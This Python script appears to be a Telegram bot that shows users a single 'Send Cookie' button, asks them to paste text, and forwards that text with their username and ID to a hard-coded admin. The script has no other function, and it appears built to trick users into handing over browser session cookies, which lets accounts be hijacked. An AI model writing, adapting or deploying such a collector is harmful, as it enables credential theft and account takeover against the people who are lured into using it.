from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart
from aiogram.types import Message, KeyboardButton, ReplyKeyboardMarkup
import asyncio

BOT_TOKEN = "TOKEN"
ADMIN_ID = 123456789  # Твой Telegram ID

bot = Bot(BOT_TOKEN)
dp = Dispatcher()

waiting = set()

keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="Отправить Cookie")]
    ],
    resize_keyboard=True
)

@dp.message(CommandStart())
async def start(message: Message):
    await message.answer(
        "Нажмите кнопку ниже.",
        reply_markup=keyboard
    )

@dp.message(F.text == "Отправить Cookie")
async def send_cookie(message: Message):
    waiting.add(message.from_user.id)
    await message.answer("Отправьте текст.")

@dp.message()
async def get_text(message: Message):
    if message.from_user.id not in waiting:
        return

    waiting.remove(message.from_user.id)

    username = f"@{message.from_user.username}" if message.from_user.username else "Нет"

    await bot.send_message(
        ADMIN_ID,
        f"""Новое сообщение

Username: {username}
ID: {message.from_user.id}

{message.text}"""
    )

    await message.answer("Отправлено.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())